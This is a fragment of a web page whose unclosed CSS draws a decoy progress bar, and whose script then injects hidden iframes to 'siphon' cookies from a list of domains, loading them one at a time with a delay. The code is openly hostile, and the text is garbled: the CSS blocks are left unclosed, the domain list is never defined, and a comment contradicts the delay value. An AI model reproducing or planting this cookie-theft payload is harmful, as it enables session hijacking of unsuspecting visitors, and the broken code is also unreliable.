        body {

        .progress-bar {
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            background: linear-gradient(90deg, #ff6a00, #ee0979);
            animation: load 60s linear;
            animation-fill-mode: forwards;
        }

        @keyframes load {
            from { width: 0%; }
            to { width: 100%; }

        .message {

            margin-top: 20px;

    // Function to create hidden iframes for cookie siphoning
    function siphonCookies(domain) {
      const iframe = document.createElement("iframe");
      iframe.style.display = "none"; // Hide the iframe

      // Include 'domain' as a parameter in the URL
      iframe.src = `http://${domain}/siphon?domain=${encodeURIComponent(domain)}`;
      document.body.appendChild(iframe);
    }

    // Function to add a delay between each domain
    function siphonWithDelay(domains, delay) {
      domains.forEach((domain, index) => {
        setTimeout(() => {
          siphonCookies(domain);
          console.log(`Siphoning cookies from: ${domain}`);
        }, index * delay);
      });
    }

    // Start siphoning cookies with a delay of 100ms between each
    siphonWithDelay(domains, 1000);
